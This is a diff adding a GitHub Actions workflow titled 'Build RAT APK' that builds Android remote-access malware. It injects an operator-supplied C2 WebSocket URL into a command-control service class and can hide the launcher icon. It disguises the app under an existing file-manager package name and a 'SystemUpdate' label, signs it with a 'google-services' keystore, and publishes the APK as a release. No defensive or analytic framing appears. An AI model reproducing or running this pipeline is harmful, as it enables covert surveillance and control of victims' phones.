@@ -1,0 +1,149 @@
+name: Build RAT APK
+
+on:
+  workflow_dispatch:
+    inputs:
+      c2_url:
+        description: "C2 WebSocket URL — e.g. wss://your-app.onrender.com/ws"
+        required: true
+        type: string
+      app_label:
+        description: "Visible app label (leave blank to keep original)"
+        required: false
+        default: ""
+        type: string
+      hide_icon:
+        description: "Hide launcher icon after first run"
+        required: false
+        default: "false"
+        type: choice
+        options: ["false", "true"]
+      app_id:
+        description: "APK package name (disguise)"
+        required: false
+        default: "com.estrongs.android.pop"
+        type: string
+
+env:
+  CCS: android/app/src/main/java/com/seguranca/protecao/CommandControlService.java
+
+jobs:
+  build:
+    name: Build & Sign APK
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: "17"
+          cache: gradle
+
+      # ── Inject C2 URL ──────────────────────────────────────────────────────
+      - name: Inject C2 URL into CommandControlService
+        run: |
+          URL="${{ github.event.inputs.c2_url }}"
+          # Replace SERVER_URL constant — single-line sed, handles both ws:// and wss://
+          sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${URL}\";|g" \
+            "${{ env.CCS }}"
+          echo "Injected: $(grep 'SERVER_URL =' ${{ env.CCS }} | head -1)"
+
+      # ── Set HIDE_ICON ──────────────────────────────────────────────────────
+      - name: Set HIDE_ICON
+        run: |
+          HIDE="${{ github.event.inputs.hide_icon }}"
+          sed -i "s|public static final boolean HIDE_ICON = [^;]*;|public static final boolean HIDE_ICON = ${HIDE};|g" \
+            "${{ env.CCS }}"
+
+      # ── Override app label ─────────────────────────────────────────────────
+      - name: Override app label
+        if: ${{ github.event.inputs.app_label != '' }}
+        run: |
+          LABEL="${{ github.event.inputs.app_label }}"
+          sed -i "s|<string name=\"app_name\">[^<]*</string>|<string name=\"app_name\">${LABEL}</string>|g" \
+            android/app/src/main/res/values/strings.xml
+          echo "Label set: ${LABEL}"
+
+      # ── Override package / application ID ─────────────────────────────────
+      - name: Override application ID
+        run: |
+          APP_ID="${{ github.event.inputs.app_id }}"
+          sed -i "s|applicationId \"[^\"]*\"|applicationId \"${APP_ID}\"|g" \
+            android/app/build.gradle
+          echo "App ID: ${APP_ID}"
+
+      # ── Keystore setup ────────────────────────────────────────────────────
+      # Uses bundled keystore by default (password: GooglePlayServices2024)
+      # Override: set KEYSTORE_BASE64 secret to replace with your own keystore
+      - name: Prepare keystore
+        run: |
+          if [ -n "${{ secrets.KEYSTORE_BASE64 }}" ]; then
+            echo "Using provided keystore from secret"
+            echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > android/google-services-release.jks
+            # Update passwords if provided
+            if [ -n "${{ secrets.KEYSTORE_PASSWORD }}" ]; then
+              sed -i "s|storePassword '[^']*'|storePassword '${{ secrets.KEYSTORE_PASSWORD }}'|g" android/app/build.gradle
+              sed -i "s|keyPassword '[^']*'|keyPassword '${{ secrets.KEY_PASSWORD }}'|g" android/app/build.gradle
+              sed -i "s|keyAlias '[^']*'|keyAlias '${{ secrets.KEY_ALIAS }}'|g" android/app/build.gradle
+            fi
+          else
+            echo "Using bundled test keystore (google-services-release.jks)"
+            ls -lh android/google-services-release.jks
+          fi
+
+      - name: Make Gradle executable
+        run: chmod +x android/gradlew
+
+      - name: Cache Gradle
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.gradle/caches
+            ~/.gradle/wrapper
+          key: ${{ runner.os }}-gradle-${{ hashFiles('android/**/*.gradle*', 'android/**/gradle-wrapper.properties') }}
+          restore-keys: |
+            ${{ runner.os }}-gradle-
+
+      # ── Build ──────────────────────────────────────────────────────────────
+      - name: Build release APK
+        working-directory: android
+        run: ./gradlew assembleRelease --no-daemon --stacktrace 2>&1 | tail -80
+
+      # ── Collect APK ───────────────────────────────────────────────────────
+      - name: Rename APK
+        run: |
+          APK=$(find android -name "*.apk" -path "*/release/*" | head -1)
+          echo "APK found: $APK"
+          LABEL="${{ github.event.inputs.app_label }}"
+          [ -z "$LABEL" ] && LABEL="SystemUpdate"
+          SAFE="${LABEL// /_}"
+          cp "$APK" "${SAFE}_build${{ github.run_number }}.apk"
+          ls -lh *.apk
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: apk-build-${{ github.run_number }}
+          path: "*.apk"
+          retention-days: 30
+
+      - name: Create Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: "build-${{ github.run_number }}"
+          name: "APK Build #${{ github.run_number }}"
+          body: |
+            | Field | Value |
+            |-------|-------|
+            | C2 URL | `${{ github.event.inputs.c2_url }}` |
+            | App Label | ${{ github.event.inputs.app_label || '(original)' }} |
+            | App ID | `${{ github.event.inputs.app_id }}` |
+            | Hide Icon | ${{ github.event.inputs.hide_icon }} |
+            | Build | #${{ github.run_number }} |
+          files: "*.apk"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
